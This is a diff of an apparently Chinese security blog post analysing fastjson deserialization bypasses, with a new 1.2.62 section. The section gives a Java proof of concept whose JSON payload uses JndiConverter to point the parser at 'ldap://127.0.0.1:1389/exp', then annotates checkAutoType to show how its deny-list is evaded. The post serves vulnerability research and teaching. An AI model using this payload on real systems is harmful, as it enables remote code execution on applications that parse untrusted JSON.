@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/mi3aka.eu.org\/fastjson\/"
-        },"genre": "posts","wordcount":  8126 ,
+        },"genre": "posts","wordcount":  11387 ,
         "url": "https:\/\/mi3aka.eu.org\/fastjson\/","datePublished": "2022-11-10T14:08:30+00:00","dateModified": "2022-11-10T14:08:30+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,8 +104,8 @@
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">fastjson分析</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author">
                     <a href="/" title="Author" rel="author" class="author">Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-10">2022-11-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 8126 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 17 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-10">2022-11-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 11387 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 23 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -123,16 +123,29 @@
     <li><a href="#1224">1.2.24</a>
       <ul>
         <li><a href="#黑名单处理方法">黑名单处理方法</a></li>
-        <li><a href="#jdbcrowsetimpl利用">JdbcRowSetImpl利用</a></li>
-        <li><a href="#templatesimpl利用">TemplatesImpl利用</a></li>
+        <li><a href="#jdbcrowsetimpl分析">JdbcRowSetImpl分析</a></li>
+        <li><a href="#templatesimpl分析">TemplatesImpl分析</a></li>
       </ul>
     </li>
-    <li><a href="#1225-41">1.2.25-41</a></li>
-    <li><a href="#1242">1.2.42</a></li>
-    <li><a href="#1243">1.2.43</a></li>
+    <li><a href="#1225-41">1.2.25-41</a>
+      <ul>
+        <li><a href="#checkautotype分析">checkAutoType分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#1242">1.2.42</a>
+      <ul>
+        <li><a href="#checkautotype分析-1">checkAutoType分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#1243">1.2.43</a>
+      <ul>
+        <li><a href="#checkautotype分析-2">checkAutoType分析</a></li>
+      </ul>
+    </li>
     <li><a href="#1245">1.2.45</a>
       <ul>
-        <li><a href="#mybatis的利用">mybatis的利用</a></li>
+        <li><a href="#checkautotype分析-3">checkAutoType分析</a></li>
+        <li><a href="#mybatis分析">mybatis分析</a></li>
       </ul>
     </li>
     <li><a href="#1247">1.2.47</a>
@@ -141,9 +154,37 @@
         <li><a href="#开启autotypesupport">开启AutoTypeSupport</a></li>
       </ul>
     </li>
+    <li><a href="#1262">1.2.62</a>
+      <ul>
+        <li><a href="#checkautotype分析-4">checkAutoType分析</a></li>
+        <li><a href="#jndiconverter分析">JndiConverter分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#1266">1.2.66</a>
+      <ul>
+        <li><a href="#jndirealmfactory分析">JndiRealmFactory分析</a></li>
+        <li><a href="#anterosdbcpconfig分析">AnterosDBCPConfig分析</a></li>
+        <li><a href="#jtatransactionconfig分析">JtaTransactionConfig分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#1267">1.2.67</a>
+      <ul>
+        <li><a href="#cachejnditmlookup分析">CacheJndiTmLookup分析</a></li>
+        <li><a href="#jndiobjectfactory分析">JndiObjectFactory分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#1268">1.2.68</a>
+      <ul>
+        <li><a href="#checkautotype分析-5">checkAutoType分析</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p><a href="https://tttang.com/archive/1579/" target="_blank" rel="noopener noreffer ">参考文章 Fastjson 反序列化分析</a></p>
+            </div><div class="content" id="content"><blockquote>
+<p>参考文章</p>
+</blockquote>
+<p><a href="https://tttang.com/archive/1579/" target="_blank" rel="noopener noreffer ">Fastjson 反序列化分析</a></p>
+<p><a href="https://www.anquanke.com/post/id/232774" target="_blank" rel="noopener noreffer ">浅析Fastjson1.2.62-1.2.68反序列化漏洞</a></p>
 <h2 id="基本使用">基本使用</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1226,7 +1267,7 @@
         data-sizes="auto"
         alt="https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png"
         title="https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png" /></p>
-<h3 id="jdbcrowsetimpl利用">JdbcRowSetImpl利用</h3>
+<h3 id="jdbcrowsetimpl分析">JdbcRowSetImpl分析</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1394,7 +1435,7 @@
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="templatesimpl利用">TemplatesImpl利用</h3>
+</div><h3 id="templatesimpl分析">TemplatesImpl分析</h3>
 <blockquote>
 <p>todo</p>
 </blockquote>
@@ -1459,9 +1500,7 @@
         data-sizes="auto"
         alt="https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png"
         title="https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png" /></p>
-<blockquote>
-<p>分析<code>checkAutoType</code>函数</p>
-</blockquote>
+<h3 id="checkautotype分析">checkAutoType分析</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1593,9 +1632,7 @@
         data-sizes="auto"
         alt="https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png"
         title="https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png" /></p>
-<blockquote>
-<p>分析<code>checkAutoType</code>函数</p>
-</blockquote>
+<h3 id="checkautotype分析-1">checkAutoType分析</h3>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -1731,9 +1768,7 @@
         data-sizes="auto"
         alt="https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png"
         title="https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png" /></p>
-<blockquote>
-<p>分析<code>checkAutoType</code>函数</p>
-</blockquote>
+<h3 id="checkautotype分析-2">checkAutoType分析</h3>
 <p><code>1.2.43</code>版本的<code>checkAutoType</code>函数针对双写L和;的情况做出限制</p>
 <p>但在前面对<code>TypeUtils.loadClass</code>的分析可以知道,fastjson处理对<code>L;</code>特殊处理外,还对<code>[</code>进行了特殊处理</p>
 <p><img
@@ -1882,9 +1917,7 @@
         data-sizes="auto"
         alt="https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png"
         title="https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png" /></p>
-<blockquote>
-<p>分析<code>checkAutoType</code>函数</p>
-</blockquote>
+<h3 id="checkautotype分析-3">checkAutoType分析</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1915,7 +1948,7 @@
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="mybatis的利用">mybatis的利用</h3>
+</div><h3 id="mybatis分析">mybatis分析</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2299,7 +2332,1211 @@
         data-sizes="auto"
         alt="https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png"
         title="https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png" /></p>
-</div><div class="post-footer" id="post-footer">
+<h2 id="1262">1.2.62</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">与1.2.45的绕过类似,通过xbean-reflect进行绕过
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_62</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.xbean.propertyeditor.JndiConverter\&#34;,\&#34;AsText\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png, https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png 1.5x, https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png"
+        title="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png" /></p>
+<h3 id="checkautotype分析-4">checkAutoType分析</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">expectClassFlag</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//当且仅当expectClass参数不为空且不为Object,Serializable...等类型时expectClassFlag才为true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Serializable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Cloneable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Closeable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">EventListener</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Iterable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h1</span> <span class="o">=</span> <span class="o">(</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">h1</span> <span class="o">==</span> <span class="mh">0xaf64164c86024f1aL</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// [
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((</span><span class="n">h1</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span> <span class="o">==</span> <span class="mh">0x9198507b5af98f0L</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h3</span> <span class="o">=</span> <span class="o">(((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">internalWhite</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">INTERNAL_WHITELIST_HASHCODES</span><span class="o">,</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">fnv1a_64</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span><span class="c1">//内部白名单检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((!</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//不在内部白名单中且开启autotype或expectClassFlag为true,进行检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//org.apache.xbean.propertyeditor.JndiConverter不在黑名单中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">jsonType</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span><span class="c1">//判断指定class是否存在JsonType注解信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">resource</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;.class&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">defaultClassLoader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">defaultClassLoader</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">ParserConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">is</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ClassReader</span> <span class="n">classReader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassReader</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">TypeCollector</span> <span class="n">visitor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TypeCollector</span><span class="o">(</span><span class="s">&#34;&lt;clinit&gt;&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">classReader</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">visitor</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jsonType</span> <span class="o">=</span> <span class="n">visitor</span><span class="o">.</span><span class="na">hasJsonType</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportAutoType</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">autoTypeSupport</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">autoTypeSupport</span> <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span><span class="c1">//判断是否开启autotype支持
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span><span class="c1">//满足条件,进行恶意类加载
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">boolean</span> <span class="n">cacheClass</span> <span class="o">=</span> <span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="n">cacheClass</span><span class="o">);</span><span class="c1">//加载恶意类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
